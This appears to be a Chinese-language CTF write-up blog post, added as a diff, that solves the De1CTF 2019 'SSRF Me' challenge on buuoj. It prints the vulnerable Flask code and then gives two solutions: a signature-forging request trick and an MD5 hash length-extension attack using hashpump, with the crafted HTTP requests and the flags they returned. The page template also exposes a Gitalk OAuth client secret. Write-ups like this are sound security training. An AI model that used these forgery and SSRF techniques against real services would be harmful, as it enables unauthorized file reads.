@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="blog" />
+   
+  <meta name="description" content="晴天`blog" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    buuoj刷题记录4 |  晴天`blog
+  </title>
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+  
+<script src="/js/pace.min.js"></script>
+
+
+  
+
+  
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="晴天`blog" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    <main class="content">
+      <section class="outer">
+  <article id="post-buuoj刷题记录4" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  buuoj刷题记录4
+</h1>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2019/12/28/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/" class="article-date">
+  <time datetime="2019-12-28T13:16:16.000Z" itemprop="datePublished">2019-12-28</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">刷题记录</a>
+  </div>
+
+    </div>
+    
+
+    
+    
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><h3 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h3><p>大致了解flask框架，<a href="http://www.security-database.com/detail.php?alert=CVE-2019-9948" target="_blank" rel="noopener">CVE-2019-9948</a>：<code>urlopen（）可包含本地文件</code>，<a href="https://www.freebuf.com/articles/web/31756.html" target="_blank" rel="noopener">哈希长度扩展攻击</a> 。</p>
+<a id="more"></a>
+
+<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>题目提示 <code>flag在./flag.txt中</code>。</p>
+<p>打开链接查看源码，在buuoj的复现过程中，查看源码只拿到一行，需要自己一个一个的敲回车改格式。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):  <span class="comment">#对secert_key、param、action进行MD5运算  的结果与self.sign作比较</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))  <span class="comment"># urllib.unquote 相当与  urldecode</span></span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest() <span class="comment">#对secert_key、param、action进行MD5摘要签名</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
+
+<p>分析代码，总共三条路由，<code>@app.route(&#39;/&#39;)</code>显示代码，<code>@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])</code>生成签名，<code>@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])</code>获取参数并执行<code>Exec()</code>函数</p>
+<p>大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，<code>param=flag.txt</code>，<code>action</code> 中要含有 <code>read</code> 和 <code>scan</code>，且 <code>sign=md5(secert_key + param + action)</code></p>
+<p>在<code>getSign</code>函数中，生成MD5签名的方式是<code>secert_key + param + action</code>其中<code>action=scan</code>，<code>secert_key</code>未知<code>param</code>可以控制。</p>
+<p>在<code>@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])</code>中，<code>cookies</code>中的<code>action</code>必须为<code>readscan</code>，sign为</p>
+<p><code>secert_key + param + scan</code>签名后的md5，使<code>param=flag.txtread</code>直接获取到签名后的md5。</p>
+<h3 id="0x02-开始操作"><a href="#0x02-开始操作" class="headerlink" title="0x02 开始操作"></a>0x02 开始操作</h3><p>先获取到签名后的md5</p>
+<p>访问<code>http://35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn/geneSign?param=flag.txtread</code></p>
+<p>返回为<code>0155303824bd0738b4ed0a52b7446c08</code></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/De1ta?param=flag.txt</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Cookie</span>: action=readscan; sign=0155303824bd0738b4ed0a52b7446c08</span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<p><code>{&quot;code&quot;: 200, &quot;data&quot;: &quot;flag{04726554-0f9f-47f4-9c1a-114e21e68594}\n&quot;}</code></p>
+<h3 id="0x02-另一种解法"><a href="#0x02-另一种解法" class="headerlink" title="0x02 另一种解法"></a>0x02 另一种解法</h3><p>使用hashdump 利用哈希长度扩展攻击，</p>
+<p>已知<code>（secret+flag.txt+scan）=40ad0bf20e771e768e9305810410c1b9</code></p>
+<p>求<code>（secret+flag.txt+scanread）</code></p>
+<p>经过测试密钥是16位 加上scanread是24位。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp/HashPump<span class="comment"># hashpump </span></span><br><span class="line">Input Signature: 40ad0bf20e771e768e9305810410c1b9</span><br><span class="line">Input Data: scan   <span class="comment">#写上原有数据</span></span><br><span class="line">Input Key Length: 24    <span class="comment">#密钥长度+数据长度+拓展的数据长度</span></span><br><span class="line">Input Data to Add: <span class="built_in">read</span>   <span class="comment">#拓展的数据</span></span><br><span class="line">46a6ff04f7bede58de30e93410935976 <span class="comment">#生成的MD5</span></span><br><span class="line">scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read</span><br></pre></td></tr></table></figure>
+
+<p><code>burp suite</code>提交的数据</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/De1ta?param=flag.txt</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 6e84dbce-e560-4f27-86f2-54cb202c45fe.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line">Cookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read;sign=46a6ff04f7bede58de30e93410935976</span><br></pre></td></tr></table></figure>
+
+<p>结果<code>{&quot;code&quot;: 200, &quot;data&quot;: &quot;flag{6cd67cbd-fdfb-45cc-8654-52766ef0635a}\n&quot;}</code></p>
+
+      
+      <!-- 打赏 -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://sunny250.github.io/2019/12/28/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/" data-id="ckl3uft8x00131cq2dfbi1tp9"
+        class="article-share-link">分享</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/De1CTF/" rel="tag">De1CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/buuctf/" rel="tag">buuctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+  
+  <nav class="article-nav">
+    
+      <a href="/2019/12/30/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%955/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            buuoj刷题记录5
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2019/12/27/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">buuoj刷题记录3</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+
+  
+  
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'c2ff86b3b4668317d630',
+      clientSecret: '92facc954b6661c7556b845f2cb775dfb77df12c',
+      repo: 'sunny250.github.io',
+      owner: 'sunny250',
+      admin: ['sunny250'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul class="list-inline">
+      <li>
+        &copy;
+        2019-2021
+        sunny250
+      </li>
+      <li>
+        
+        
+        
+        <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a> by shenyu
+        
+      </li>
+    </ul>
+    <ul class="list-inline">
+      <li>
+        
+        
+        <ul class="list-inline">
+  <li>PV:<span id="busuanzi_value_page_pv"></span></li>
+  <li>UV:<span id="busuanzi_value_site_uv"></span></li>
+</ul>
+        
+      </li>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+    <div class="to_top">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+      </div>
+    </main>
+    
+    <aside class="sidebar">
+      
+        <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/logo.jpg" alt="晴天`blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives/">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories/">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/links/">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about/">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+      </aside>
+      
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+
+<script src="/js/ayer.js"></script>
+
+
+
+  <script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+  </div>
+</body>
+
+</html>
